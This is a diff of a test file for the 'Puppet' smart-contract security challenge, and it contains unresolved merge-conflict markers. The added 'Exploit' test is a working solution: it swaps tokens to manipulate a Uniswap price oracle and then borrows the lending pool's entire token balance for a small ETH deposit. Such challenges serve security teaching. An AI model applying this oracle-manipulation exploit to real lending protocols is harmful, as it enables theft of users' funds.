@@ -93,8 +93,39 @@ describe('[Challenge] Puppet', function () {
         ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE * 2n);
     });
 
+<<<<<<< Updated upstream
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+=======
+    it('Exploit', async function () {
+        const attackPool = this.lendingPool.connect(attacker);
+        const attackExchange = this.uniswapExchange.connect(attacker);
+        const attackToken = this.token.connect(attacker);
+
+        await attackToken.approve(attackExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+
+        const ethReceivable = await attackExchange.getTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE,
+            {
+                gasLimit: 1e6
+            });
+        await attackExchange.tokenToEthSwapInput(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            ethReceivable,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+        )
+
+        const requiredDeposit = await attackPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE, {gasLimit: 1e6});
+        await attackPool.borrow(POOL_INITIAL_TOKEN_BALANCE, {
+            value: requiredDeposit
+        })
+
+        const requiredETH = await attackExchange.getEthToTokenOutputPrice(ATTACKER_INITIAL_TOKEN_BALANCE,{ gasLimit: 1e6})
+
+        await attackExchange.ethToTokenSwapOutput(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,{value: requiredETH,}
+        )
+>>>>>>> Stashed changes
     });
 
     after(async function () {
